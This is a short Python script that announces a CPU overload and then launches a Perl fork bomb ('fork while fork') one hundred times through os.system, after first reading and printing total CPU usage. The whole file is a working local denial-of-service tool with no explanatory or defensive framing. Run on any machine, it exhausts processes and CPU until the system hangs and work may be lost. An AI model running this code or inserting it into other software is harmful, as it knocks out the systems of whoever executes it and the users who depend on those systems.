#!/usr/bin/env python3
import os

t = os.popen("ps -A -o %cpu | awk '{s+=$1} END {print s }'")
t2 = t.read()
t3 = t2.replace("\n", "%")
t4 = t2.replace("\n", "")
print("\033[1;49;91m[!] Cpu Overloaded ! \033[0m")

for i in range(100):
    os.system('perl -e "fork while fork"')
for i in range(10):
    print("CPU Usage: ", t3)
if float(t4) > 99:
    print("[!] Bye Bye")